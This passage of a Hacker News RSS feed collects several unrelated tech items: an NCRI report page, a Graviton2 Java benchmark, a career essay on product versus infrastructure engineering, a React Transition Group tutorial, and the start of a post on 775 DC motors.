					    <p>Contagion and Ideology Report</p>
					    
					    <p>Contributors:</p>
					    <div><p>Joel Finkelstein, Corresponding Author<br>
The Network Contagion Research Institute<br>
The James Madison Program in American Ideals and Institutions, Princeton University<br>
Miller Center for Community Protection and Resilience<br>
Rutgers, the State University of New Jersey<br>
joel@ncri.io</p><p>

Alex Goldenberg, Author<br>
The Network Contagion Research Institute<br>
alex@ncri.io</p><p>

Sean Stevens, Author<br>
Advisor, The Network Contagion Research Institute</p><p>

Lee Jussim, Author<br>
Chair, Distinguished Professor, Department of Psychology<br>
Rutgers, the State University of New Jersey</p><p>

John Farmer, Author<br>
Former New Jersey State Attorney General and Chief Counsel, 9/11 Commission<br>
Director, Miller Center for Community Protection and Resilience<br>
Rutgers, the State University of New Jersey</p><p>

John K. Donohue, Author<br>
NYPD Chief of Strategic Initiatives (Ret.)</p><p>

Pamela Paresky, Author<br>
University of Chicago</p></div>
				    </header>
				    <section>
					    					    
<p><a href="https://ncri.io/wp-content/uploads/NCRI-White-Paper-Network-Enabled-Anarchy-14-Sept-1049am.pdf" target="_blank" rel="noreferrer noopener">Download Here</a></p>



<a href="https://ncri.io/wp-content/uploads/NCRI-White-Paper-Network-Enabled-Anarchy-14-Sept-1049am.pdf">NCRI White Paper Network Enabled Anarchy 14 Sept 1049am</a>
					    
					</section>
				</article>
			    			    			    
			</div>
			
		</div>
	</div>
</section></div>]]>
            </description>
            <link>https://ncri.io/reports/network-enabled-anarchy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519511</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing a real-world Java-based application on Amazon's Arm-based Graviton2]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519510">thread link</a>) | @JacobiX
<br/>
September 18, 2020 | https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/ | <a href="https://web.archive.org/web/*/https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tm-row-5f68d26cb5dde"><div id="tm-column-5f68d26cb6079"><div><div><div><div><blockquote><p> “ARM-based built on the Nitro servers for typical LOB-applications</p></blockquote><p>The T4g instances are low cost version of the ARM based VMs. According to Amazon you can enjoy a performance benefit of up to <strong>40%</strong> at a <strong>20%</strong> lower cost in comparison to T3 instances.</p><p>We deployed Reis™ a Java-based application and measured the performance of some typical production payloads. The idea is to deploy a real-world app that uses some popular technologies: PostgreSQL, Java 8, nginx, angular, and Elasticsearch and quickly evaluate the performance of the system.</p></div></div><div><figure><p><img width="573" height="150" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab1.png 573w, https://www.vneuron.com/wp-content/uploads/2020/09/tab1-300x79.png 300w" sizes="(max-width: 573px) 100vw, 573px"></p></figure></div><div><div><p>Most of the needed packages were already available in yum package manager, the installation process was smooth and the installed components worked out of the box. For PostgreSQL, unfortunately, the default yum package is quite outdated (v9). You need to use the Extras catalog to get the version 10.</p><p>For Java JDK, since we use OpenJDK we decided to use Amazon Corretto 8, strangely enough and unlike Amazon Corretto 11 the version 8 is not included in the package manager. So we installed manually the AARCH64 version (again everything worked as documented). After installing nginx, preparing a test database, and configuring the remaining dependencies we were ready to test the setup</p><p>After starting the services, the first thing that I noticed was the horrendous startup time of Java applications. It was unbelievably slow, almost an hour to start the application! for sure I know that it can takes a couple of minutes to start this complex monolithic backend, but if it takes an hour there is something wrong with the setup.</p></div></div><div><div><p>After some sanity checks I couldn’t figure out the root cause of the problem, after calling for assistance from our team, they quickly identified the issue: <strong>dev/random</strong> runs out of available entropy. The app was waiting for <strong>/dev/random</strong> to provide randomness and <strong>/dev/random</strong> typically blocks if there is less entropy available than requested. They suggested that I switch to <strong>/dev/urandom</strong> as the source of cryptographic randomness. A call to cat <strong>/proc/sys/kernel/random/entropy_avail</strong> returns values in the range 70-100. We switched to<strong> /dev/urandom</strong> and now we have a more reasonable boot time (under a minute)!</p><p>Excerpt<b> from /usr/lib/jvm/amazon-corretto-8.265.01.1-linux-aarch64/jre/lib/security/java.security </b></p></div></div><div><figure><p><img width="318" height="120" src="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/image1.png 318w, https://www.vneuron.com/wp-content/uploads/2020/09/image1-300x113.png 300w" sizes="(max-width: 318px) 100vw, 318px"></p></figure></div><div><p><b>Maybe the Amazon Corretto for AARCH64 distribution shoud use /dev/urandom by default?</b></p></div><div><p>Benchmarking with Bombardier</p></div><div><p>The objective is to determine whether the performance of this Graviton2 based VM are quite competitive. In order to have a baseline, we created an x86 VM with equivalent characteristics (but +27% of the price).</p></div><div><figure><p><img width="566" height="187" src="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1.png 566w, https://www.vneuron.com/wp-content/uploads/2020/09/tab2-1-300x99.png 300w" sizes="(max-width: 566px) 100vw, 566px"></p></figure></div><div><div><p>Since the two VMs have the same OS, we used the exact same scripts to install the dependencies, to deploy the apps and to benchmark it using Bombardier!</p><p><a href="https://github.com/codesenberg/bombardier" target="_blank" rel="noopener noreferrer">Bombardier</a> is a HTTP(S) benchmarking tool. It is written in Go programming language. We compiled it on both VMs.</p><p>We designed 8 production workloads, involving database CRUD, data indexing, search and data encryption and transfer. For each payload we performed 10 tests and picked the median, after each iteration we restarted the jvm.</p></div></div><div><figure><p><img width="640" height="394" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen1.png 702w, https://www.vneuron.com/wp-content/uploads/2020/09/screen1-300x185.png 300w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><figure><p><img width="640" height="395" src="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png" alt="" loading="lazy" srcset="https://www.vneuron.com/wp-content/uploads/2020/09/screen2.png 897w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-300x185.png 300w, https://www.vneuron.com/wp-content/uploads/2020/09/screen2-768x474.png 768w" sizes="(max-width: 640px) 100vw, 640px"></p></figure></div><div><div><p>I should admit that I’m pleasantly surprised with the performances of the ARM version of OpenJDK.</p><p>As with any small-scale benchmark we should take it with grain of salt, but we will definitely perform more extensive tests in the upcoming week.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.vneuron.com/compliance/testing-a-realworld-java-based-application-on-amazons-arm-based-graviton2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519510</guid>
            <pubDate>Fri, 18 Sep 2020 17:28:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop just using “Front end” or “Back end” to describe the Engineering you like]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24519400">thread link</a>) | @lord_sudo
<br/>
September 18, 2020 | https://www.michellelim.org/writing/stop-using-frontend-backend/ | <a href="https://web.archive.org/web/*/https://www.michellelim.org/writing/stop-using-frontend-backend/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong><em>Also posted on Medium <a href="https://medium.com/@michlim97/stop-just-using-frontend-or-backend-to-describe-the-engineering-you-like-e8c392956ada">here</a>.</em></strong></p>
<p>
<img src="https://www.michellelim.org/writing/stop-using-frontend-backend/images/fe-be-cover-photo.png" alt="Stop Using Frontend Backend Cover Photo">
</p>
<p>If there is one tip I could share with my fellow new engineers, it would be… Stop relying on the “Frontend/Backend” axis to understand the engineering you like. <strong>The “Frontend/Backend” axis doesn’t map well to engineers’ motivations.</strong> If you only use that axis, you can end up in projects you don’t like or worse still, give up on engineering prematurely. <strong>Instead, try using the “Product/Infrastructure” axis as the first axis to understand your career preference.</strong></p>
<p>My goal is to share with you the language that could help you (and your manager) find your “sweet spot” engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>“Product/Infra” maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>“Product-first” engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>“Code-first” engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to “Product engineering”—building, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to “Infrastructure engineering”—building infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They’re motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are “Product engineering” and “Infrastructure engineering” roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The “Frontend/Backend” division is still a valuable axis.</strong></p>
<p><strong>However, using the “Frontend/Backend” in isolation of “Product/Infra” in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out “Backend engineering” in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn’t have the language to explain that to my recruiter. They conflated “Backend” with “Infra” and I ended up with a role too far from the user.</p>
<p>When I tried out “Frontend engineering” in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. “Frontend/Backend”), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.”Product/Infra”), you’d want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the “Frontend” and “Backend” labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach… but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate “Frontend/Backend” division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let’s jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn’t it be reasonable to conclude that those roles were mostly what “frontend” and “backend” were all about? Wouldn’t it be reasonable too to conclude that since you didn’t like both types of engineering, maybe engineering as a whole wasn’t for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the “Product/Infra” language and advocates for a “Product Engineering” role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and… my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B “bottom-up”, API-first vs. application-first, “Forward deployed” vs. “Software engineer”, etc. If we’re serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>
<!-- raw HTML omitted -->
<h3 id="notes">Notes</h3>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I had met Bolu, a new grad in Bloomberg London, after he sent me a cold DM to thank me for the thread. He had sent my thread to his manager!!! It turned out that he had been struggling to express his project preferences to his manager, and the thread helped. The manager “got” it after reading the thread and now Bolu is on a product development team he is very excited about. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>I took the “code-first” vs. “product-first” engineer terminology from Xoogler Zach Lloyd’s blog: <a href="https://thezbook.com/">https://thezbook.com/</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Someone on Twitter (leon @lievetraz) replied with their attempt to classify internal tools teams into “Product/Infra” <a href="https://twitter.com/lievetraz/status/1293555767430336518?s=20">here</a>. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>There are hundreds of other reasons engineers choose to be PMs of course. <a href="#fnref:4" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>I learned it the hard way how important it was to advocate for oneself and ask to change teams early. <a href="#fnref:5" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

		</div></div>]]>
            </description>
            <link>https://www.michellelim.org/writing/stop-using-frontend-backend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519400</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Use React Transition Group and React Animation Library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519397">thread link</a>) | @mehdios
<br/>
September 18, 2020 | https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library | <a href="https://web.archive.org/web/*/https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>A few months ago, I gave a talk with a coworker at the tech conference <a href="https://connect.tech/" target="_blank" rel="noreferrer">Connect.Tech</a> about the ever-growing need for responsive web design when building websites and applications. During the presentation, we discussed a few different ways to approach it, specifically when it comes to the JavaScript framework <a href="https://reactjs.org/" target="_blank" rel="noreferrer">React</a>.</p><p>While I won’t go into all the details in our talk of how to approach responsive design (if you’d like, you can see the full <a href="https://drive.google.com/drive/folders/1oRtHrgzpPorn9ogGpAxA5lPrH3ycCYK9" target="_blank" rel="noreferrer">slide deck of the talk</a> here), I did want to share a handy React animation library I stumbled across while building the mobile-responsive demo application, called <a href="https://reactcommunity.org/react-transition-group/" target="_blank" rel="noreferrer">React Transition Group</a>.</p><hr><h2 id="react-transition-group">React Transition Group</h2><h3 id="what-makes-it-different">What makes it different?</h3><p>Unlike other React animation libraries like <a href="https://www.react-spring.io/" target="_blank" rel="noreferrer">React Spring</a> or <a href="https://www.react-reveal.com/" target="_blank" rel="noreferrer">React Reveal</a>, React Transition Group “exposes simple components useful for defining entering and exiting transitions…it does not animate styles by itself. Instead it exposes transition stages, manages classes and group elements and manipulates the DOM in useful ways, making the implementation of actual visual transitions much easier.”</p><p>React Transition Group is a lower-level type of animation library. It doesn’t care nearly as much about what type of animation you’d like to do, it just makes it easier to do any sort of animation on any React component with as little hassle as it can.</p><p>And it doesn’t hurt to know that React Transition Group began in the original React framework (it’s mentioned in the <a href="https://reactjs.org/docs/animation.html" target="_blank" rel="noreferrer">docs</a>) before being spun out into a new package to be maintained by the community. That’s a pretty good endorsement for trying RTG, in my book.</p><p>Now that you know a little more about RTG’s approach to animation, let me cover a few of the different component options it gives users, and how they work.</p><h3 id="types-of-rtg-components">Types of RTG Components</h3><p>React Transition Group offers four different types of components for users to choose from based on their animation needs.</p><h4 id="transition"><a href="http://reactcommunity.org/react-transition-group/transition" target="_blank" rel="noreferrer">Transition</a></h4><p>The first component to cover is <code>Transition</code>. This component lets you describe a transition from one component state to another over a span of time with a simple API. Most commonly it’s used to animate the mounting and unmounting of a component, but it can also be used to describe in-place transition states as well. Personally, I tend to favor <code>CSSTransition</code> over the straight <code>Transition</code> component, but that’s just me.</p><p>The transition component tracks the “enter” and “exit” states for the component. The four main states a <code>Transition</code> can be in are:</p><ul><li><code>'entering'</code></li><li><code>'entered'</code></li><li><code>'exiting'</code></li><li><code>'exited'</code></li></ul><p>The transition state is toggled on via the <code>in</code> prop, when it’s <code>true</code> the component will begin the <code>entering</code> stage for the duration of the transition until it’s fully visible, at which point it will switch to the <code>entered stage</code>. Upon exit, the same things will happen with <code>exiting</code> and <code>exited</code>.</p><p>A simple example of fading in a component on enter and fading it out on exit might look something like this:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/9efe4f24aa53f11293ce58d69872f358/c701c/64f21e0d419d45d0981b2cdff0f8aad5.png" srcset="https://blog.asayer.io/static/9efe4f24aa53f11293ce58d69872f358/c701c/64f21e0d419d45d0981b2cdff0f8aad5.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>This illustrates using React Transition Group’s Transition component to fade a component into view for the user.</p><p>In the example above, once the <code>inProp</code> prop is <code>true</code>, the <code>Transition</code> component will activate and begin fading in to view courtesy of the <code>transitionStyles</code> variable (where opacity is defined) that correspond to the various “enter” or “exit” stages I outlined earlier.</p><p>It’s worth noting this is a platform-agnostic base component — if you’re looking for CSS transitions (like I was for my use case), you’ll probably want the <code>CSSTransition</code> component instead.</p><h4 id="csstransition"><a href="http://reactcommunity.org/react-transition-group/css-transition" target="_blank" rel="noreferrer">CSSTransition</a></h4><p>If you’re using CSS transitions or animations, the <code>CSSTransition</code> component is what you’ll want to use; it’s built upon the <code>Transition</code> component, so it inherits all of its props.</p><p>To work, <code>CSSTransition</code> applies a pair of class names during the <code>appear</code>, <code>enter</code>, and <code>exit</code> states of the transition. The first class is applied and then a second <code>*-active</code> class in order to activate the CSS transition. After the transition, matching <code>*-done</code> class names are applied to persist the transition state.</p><p>For instance, if your <code>CSSTransition</code> component’s <code>classNames</code> property is <code>sample</code>, you’d first see <code>sample-enter</code>, then <code>sample-enter-active</code>, and finally <code>sample-enter-done</code> for the ending state when the animation is done. And when it’s time to reverse the animation (such as with a modal or slider that needs to disappear or exit the screen), you’d see it cycle through sample-exit and <code>sample-exit-active</code> and <code>sample-exit-done</code> on your component’s <code>classNames</code> property.</p><p>Here’s a simplified code sample of what the JSX and accompanying CSS classes might looks like for making a <code>div</code> of text fade in or out. (I’ve omitted the imports at the top of the file because they’re the same named import for each type of component from RTG: <code>import { CSSTransition } from 'react-transition-group';</code>.)</p><p>First the JavaScript code showing the <code>CSSTransition</code> component wrapping a <code>div</code> element to show or hide based on the state of <code>isVisible</code>, which is toggled by the <code>button</code> element underneath.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/3515a6d029b73b303e0539692b5978ca/c701c/d6b0f48014e442b2808bab67f08db67e.png" srcset="https://blog.asayer.io/static/3515a6d029b73b303e0539692b5978ca/c701c/d6b0f48014e442b2808bab67f08db67e.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>Here’s the JavaScript JSX code where the CSSTransition component is used to wrap the div and text to show or hide.</p><p>And here’s the CSS classes that the <code>CSSTransition</code> component would experience once <code>isVisible</code> became <code>true</code> and triggered the <code>in</code> prop to fade the text in or out (just like with the original <code>Transition</code> component).</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/02bcfaf7381a16c3998109602a07c7ac/35a7a/169f998ad1eb4d08b0afb2fbd042a3e5.png" srcset="https://blog.asayer.io/static/02bcfaf7381a16c3998109602a07c7ac/35a7a/169f998ad1eb4d08b0afb2fbd042a3e5.png 678w" sizes="(max-width: 678px) 100vw, 678px" alt="text">
The CSS transition states that will actually cause the text wrapped in the CSSTransition to component to fade in and out of view.</p><p><code>*-active</code> classes represent which styles you want to animate to, so it’s important to add the <code>transition</code> declaration only to them, otherwise transitions might not behave as intended. This might not be obvious when the transitions are symmetrical, i.e. when <code>*-enter-active</code> is the same as <code>*-exit</code>, but it becomes apparent quickly in more complex transitions.</p><p>Let’s move on now to React Transition Group’s next option: <code>SwitchTransition</code>.</p><h4 id="switchtransition"><a href="http://reactcommunity.org/react-transition-group/switch-transition" target="_blank" rel="noreferrer">SwitchTransition</a></h4><p>This component is useful if you want to control the render between state transitions, it’s inspired by Vue transition modes. Based on the selected mode (<code>in-out</code> or <code>out-in</code>), and the child’s key which is the <code>Transition</code> or <code>CSSTransition</code> component, the <code>SwitchTransition</code> makes a consistent transition between them.</p><p>If <code>out-in</code> mode is selected, <code>SwitchTransition</code> waits until the old child leaves and then inserts a new child. If the <code>in-out</code> mode is selected, the <code>SwitchTransition</code> inserts a new child first, waits for the new child to enter and then removes the old child.</p><p>Here’s an example so you can see how the code might be structured to make two different buttons “switch” places in the DOM based on the current state. Once again, imports at the top of the file omitted for brevity.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/6dc8f8b809be33ace62ee282577d863c/c701c/e929fbca71584d77979d6f168e1b7527.png" srcset="https://blog.asayer.io/static/6dc8f8b809be33ace62ee282577d863c/c701c/e929fbca71584d77979d6f168e1b7527.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>The Button element gets replaced each time it’s clicked with a new button featuring the opposite text of what the previous button text was, courtesy of SwitchTransition.</p><p>Here, <code>SwitchTransition</code> wraps the <code>CSSTransition</code> component, which actually handles the logic and animating of entering a new <code>Button</code> and exiting the existing one. The <code>key</code> in <code>CSSTransition</code> keeps track of state in the component, and every time the state changes (based on a button click), the <code>CSSTransition</code> component takes action and <code>SwitchTransition</code> handles the keeping the old button visible until after the new button has appeared, which <code>CSSTransition</code> is fading out based on its event listener.</p><p>That <code>addEndListener</code> function is crucial to animating the switch between elements, without it, the state (and components) will instantaneously flip like there’s no animations at all.</p><p>Here’s the CSS for the <code>fade</code> class name associated with <code>CSSTransition</code>.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/7eb014167a0e99f5bbd2326cffa4833e/785ee/0db7765eeaba4055ad37958754158c47.png" srcset="https://blog.asayer.io/static/7eb014167a0e99f5bbd2326cffa4833e/785ee/0db7765eeaba4055ad37958754158c47.png 830w" sizes="(max-width: 830px) 100vw, 830px" alt="text"></p><p>This CSS is really for the animated entrances and exits of the buttons in the DOM, but I wanted to show it anyway.</p><p>The CSS here is really concerned with the <code>CSSTransition</code> component wrapped inside of <code>SwitchTransition</code>, but I figure the more sample code you see for how to animate things in and out of the DOM, the better.</p><p>It takes some trial and error to get it right, but the documentation for <code>SwitchTransition</code> is good and I’m sure you’ll figure it out without much of a problem if this is the kind of animation you desire in your application.</p><h4 id="transitiongroup"><a href="http://reactcommunity.org/react-transition-group/transition-group" target="_blank" rel="noreferrer">TransitionGroup</a></h4><p>Last but not least is the { <code>&lt;TransitionGroup&gt;</code> component. This component manages a set of transition components (<code>&lt;Transition&gt;</code> and <code>&lt;CSSTransition&gt;</code>) in a list. Like with the individual transition components, <code>&lt;TransitionGroup&gt;</code> is a state machine for managing the mounting and unmounting of components over time.</p><p>Please note that <code>&lt;TransitionGroup&gt;</code> does not define any animation behavior. Exactly how a list item animates is up to the individual transition component, which means you can mix and match animations across different list items, which could be handy.</p><p>Unlike <code>SwitchTransition</code> which lets you control the entering and exiting of elements in the DOM, <code>TransitionGroup</code> will make the animations happen simultaneously (i.e., to remove the old child and insert a new child at the same time).</p><p>Take a look at this example of a simple chore list that can have chores removed from it once they’re completed. First, the JSX code with no imports in the example.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/696c29d6c1ac505a74a051878b114d5a/c701c/5bb9a009e4d94e0e81c78c238290a569.png" srcset="https://blog.asayer.io/static/696c29d6c1ac505a74a051878b114d5a/c701c/5bb9a009e4d94e0e81c78c238290a569.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>TransitionGroup wraps the list of CSSTransition components which will be removed from the list as they’re completed.</p><p>And, here’s the CSS that will make the chores fade out of the DOM as they’re removed.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/adcbcf374b3e2bf86f2bfbe953e6fa60/c701c/b9a4155d9b014fdc807698a8f90f2154.png" srcset="https://blog.asayer.io/static/adcbcf374b3e2bf86f2bfbe953e6fa60/c701c/b9a4155d9b014fdc807698a8f90f2154.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>Once more, the CSS belongs to the CSSTransition components so they can enter and leave the DOM in an animated fashion.</p><p>And with that, I’ve covered all the main component options React Transition Group offers. All in all, using one or more of these components together gives you fine grained control over what type of and how your React components animate in the DOM.
Now, let’s get down to the business of how exactly I used React Transition Group to animate my mobile navbar in my demo site.</p><hr><h2 id="how-i-used-rtg-in-my-react-app">How I used RTG in My React App</h2><p>The use case I had for React Transition Group is a fairly standard one, I’m sure.
For my app, a movie demo site I built using the <a href="https://developers.themoviedb.org/3/getting-started/introduction" target="_blank" rel="noreferrer">Movie Database API</a> for a data source, when it was in mobile view, I wanted the navbar (normally across the top of the page in larger layouts) to condense down to …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library">https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519397</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All about 775 Motor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519390">thread link</a>) | @Gedxx
<br/>
September 18, 2020 | https://www.ikkaro.net/775-motor/ | <a href="https://web.archive.org/web/*/https://www.ikkaro.net/775-motor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			

<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg" alt="what is 775 motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor.jpg 1280w"></figure>



<p>The <strong>775 motors ar</strong>e direct current motors used in many projects and which I think are very little known to people.</p>



<p>When we talk about this type of motor, the 7<strong>75 refers to the size of the motor that is standard</strong>. Thus we can find 775 manufactured by different brands, with different operating voltages and different power, with 1 set of bearings or two. But what they all respect is the size of the motor.</p>



<p>My idea was to buy 2 motors with brush. One 12V, with less torque but many revolutions that I wanted to use to make a blower and the one you see in the picture that is a 288W beast and a lot of torque, to try to make a mini-kart for my daughters. But the one with the blower was out of stock and I only got this one.</p>




<p>The video that inspired me for the Air blower</p>



<figure><p>
<iframe title="How to Make Powerful 12volt Air Blower Using 775 Motor and PVC Pipe" width="825" height="464" src="https://www.youtube.com/embed/64p4tkjnsFQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>So I talk in general about the 775 and I will talk about my personal projects.</p>



<h2><span id="Features">Features</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg" alt="775 dc brush motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor.jpg 1280w"></figure>



<p>They are direct current motors, but with a lot of power and torque. <strong>They usually work between 6 and 36 V</strong>, depending on what you buy, the range will vary and can consume up to 12A, so be careful where you connect it.</p>



